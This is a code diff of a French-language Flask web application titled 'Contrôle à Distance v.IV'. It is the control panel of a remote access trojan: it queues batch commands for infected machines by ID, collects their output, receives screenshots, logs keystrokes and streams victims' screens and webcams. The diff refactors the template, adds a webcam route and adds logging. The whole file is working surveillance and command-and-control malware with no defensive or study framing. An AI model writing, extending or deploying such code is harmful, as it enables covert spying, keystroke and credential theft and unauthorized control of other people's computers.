@@ -1,4 +1,3 @@
-# app.py
 from flask import (
     Flask, request, render_template_string,
     send_file, redirect, url_for, Response
@@ -8,37 +7,37 @@ import time
 app = Flask(__name__)
 
 # État global
+destinataires = ""
 commande = ""
 resultat_commande = ""
-destinataires = ""
-mode = "cmd"        # "cmd", "live", "keys" ou "webcam"
-last_host = ""      # hostname du dernier screen reçu
-key_logs = ""       # journal des touches
+mode = "cmd"        # "cmd", "live", "webcam" ou "keys"
+last_host = ""      # hostname du dernier screenshot reçu
+key_logs = ""       # journal des frappes
 
-# Template HTML
+# Template
 html_page = """
 <!DOCTYPE html>
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Console, Live Screen & Keylogger & Webcam</title>
+  <title>Contrôle à Distance v.IV</title>
   <style>
-    body { font-family: sans-serif; padding: 20px; }
-    .section { margin-top: 30px; }
-    #stream { max-width:90vw; border:1px solid #ccc; display:block; }
+    body { font-family: sans-serif; padding:20px; }
+    .section { margin-top:30px; }
+    #stream, #webcam { max-width:90vw; border:1px solid #ccc; display:block; }
     pre { background:#f5f5f5; padding:10px; white-space: pre-wrap; }
-    button { margin-right: 10px; }
+    button { margin-right:10px; }
   </style>
 </head>
 <body>
-  <h1>🖥️ Contrôle à Distance v. IV</h1>
+  <h1>🖥️ Contrôle à Distance v.IV</h1>
 
-  <!-- Choix du mode -->
+  <!-- Mode switch -->
   <div class="section">
-    <button onclick="location.href='{{ url_for('set_mode') }}?mode=cmd'" {% if mode=='cmd' %}disabled{% endif %}>⚪ Commande</button>
-    <button onclick="location.href='{{ url_for('set_mode') }}?mode=live'" {% if mode=='live' %}disabled{% endif %}>🔴 Live</button>
-    <button onclick="location.href='{{ url_for('set_mode') }}?mode=webcam'" {% if mode=='webcam' %}disabled{% endif %}>📷 Webcam</button>
-    <button onclick="location.href='{{ url_for('set_mode') }}?mode=keys'" {% if mode=='keys' %}disabled{% endif %}>🗝️ Keylogger</button>
+    <button onclick="location.href='{{ url_for('set_mode') }}?mode=cmd'"   {% if mode=='cmd'   %}disabled{% endif %}>⚪ Commande</button>
+    <button onclick="location.href='{{ url_for('set_mode') }}?mode=live'"  {% if mode=='live'  %}disabled{% endif %}>🔴 Live</button>
+    <button onclick="location.href='{{ url_for('set_mode') }}?mode=webcam'"{% if mode=='webcam'%}disabled{% endif %}>📷 Webcam</button>
+    <button onclick="location.href='{{ url_for('set_mode') }}?mode=keys'" {% if mode=='keys'  %}disabled{% endif %}>🗝️ Keylogger</button>
   </div>
 
   {% if mode == 'cmd' %}
@@ -47,26 +46,33 @@ html_page = """
     <form action="/" method="POST">
       <input type="text" name="commande" value="{{ commande }}" size="50" placeholder="Commande batch"><br><br>
       <label>Destinataires (* = tous, !ID pour exclure) :</label>
-      <input type="text" name="destinataires" value="{{ destinataires }}"><br><br>
+      <input type="text" name="destinataires" value="{{ destinataires }}" placeholder="* ou ID1,ID2,...">
       <button type="submit">Envoyer</button>
     </form>
-    <form action="/clear_output" method="POST" style="margin-top:10px;"><button type="submit">Effacer résultats</button></form>
+    <form action="/clear_output" method="POST" style="margin-top:10px;">
+      <button type="submit">Effacer résultats</button>
+    </form>
     <h3>Résultat de la commande :</h3>
     <pre>{{ resultat_commande or "(vide)" }}</pre>
   </div>
-  {% elif mode == 'live' %}
+  {% endif %}
+
+  {% if mode == 'live' %}
   <div class="section">
     <h2>Live Screen</h2>
     <p><strong>Hostname :</strong> {{ last_host or "(aucun)" }}</p>
     <img id="stream" src="/mjpeg" alt="Live screen">
   </div>
-  {% elif mode == 'webcam' %}
+  {% endif %}
+
+  {% if mode == 'webcam' %}
   <div class="section">
     <h2>Webcam</h2>
-    <p><strong>Hostname :</strong> {{ last_host or "(aucun)" }}</p>
-    <img id="stream" src="/mjpeg" alt="Webcam stream">
+    <img id="webcam" src="/webcam" alt="Webcam stream">
   </div>
-  {% elif mode == 'keys' %}
+  {% endif %}
+
+  {% if mode == 'keys' %}
   <div class="section">
     <h2>Keylogger</h2>
     <form action="/clear_keys" method="POST" style="margin-bottom:10px;">
@@ -79,14 +85,13 @@ html_page = """
 </html>
 """
 
-@app.route("/", methods=["GET", "POST"])
+@app.route("/", methods=["GET","POST"])
 def index():
     global commande, destinataires
     if request.method == "POST":
-        commande = request.form.get("commande", "").strip()
-        destinataires = request.form.get("destinataires", "").strip()
-    return render_template_string(
-        html_page,
+        commande = request.form.get("commande","").strip()
+        destinataires = request.form.get("destinataires","").strip()
+    return render_template_string(html_page,
         commande=commande,
         destinataires=destinataires,
         resultat_commande=resultat_commande,
@@ -99,7 +104,7 @@ def index():
 def set_mode():
     global mode
     m = request.args.get("mode","")
-    if m in ("cmd","live","keys","webcam"):
+    if m in ("cmd","live","webcam","keys"):
         mode = m
     return redirect(url_for("index"))
 
@@ -109,7 +114,7 @@ def get_mode():
 
 @app.route("/get_commande")
 def get_commande():
-    mid = request.args.get('id','')
+    mid = request.args.get("id","")
     if not mid:
         return "", 400
     if destinataires == "*":
@@ -123,7 +128,7 @@ def get_commande():
 @app.route("/post_resultat", methods=["POST"])
 def post_resultat():
     global resultat_commande
-    mid = request.form.get("id"," ").strip()
+    mid = request.form.get("id","").strip()
     res = request.form.get("resultat","")
     resultat_commande += f"\n[{mid}]\n{res}\n"
     return "OK", 200
@@ -138,17 +143,21 @@ def clear_output():
 def post_screen():
     global last_host
     f = request.files.get("screen")
-    mid = request.form.get("id"," ").strip()
+    mid = request.form.get("id","").strip()
     if not f or not mid:
+        print("[post_screen] Requête invalide")
         return "Bad Request", 400
-    f.save("latest.png")
+    data = f.read()
+    with open("latest.png","wb") as imgf:
+        imgf.write(data)
     last_host = mid
-    return "Image reçue", 200
+    print(f"[post_screen] Screenshot reçu de {mid}, {len(data)} bytes")
+    return "Screenshot reçu", 200
 
 @app.route("/post_keys", methods=["POST"])
 def post_keys():
     global key_logs
-    mid = request.form.get("id"," ").strip()
+    mid = request.form.get("id","").strip()
     keys = request.form.get("keys","")
     if mid and keys:
         key_logs += f"\n[{mid}]\n{keys}\n"
@@ -173,15 +182,24 @@ def mjpeg_generator():
         try:
             with open("latest.png","rb") as img:
                 frame = img.read()
-            yield boundary + b"\r\n" + \
-                  b"Content-Type: image/png\r\n\r\n" + frame + b"\r\n"
         except FileNotFoundError:
             time.sleep(0.1)
             continue
+        yield boundary + b"\r\n" + \
+              b"Content-Type: image/png\r\n\r\n" + \
+              frame + b"\r\n"
         time.sleep(0.1)
 
 @app.route("/mjpeg")
 def mjpeg():
+    return Response(
+        mjpeg_generator(),
+        mimetype="multipart/x-mixed-replace; boundary=frame"
+    )
+
+@app.route("/webcam")
+def webcam():
+    # Placeholder : renvoie le même MJPEG pour tests
     return Response(
         mjpeg_generator(),
         mimetype="multipart/x-mixed-replace; boundary=frame"
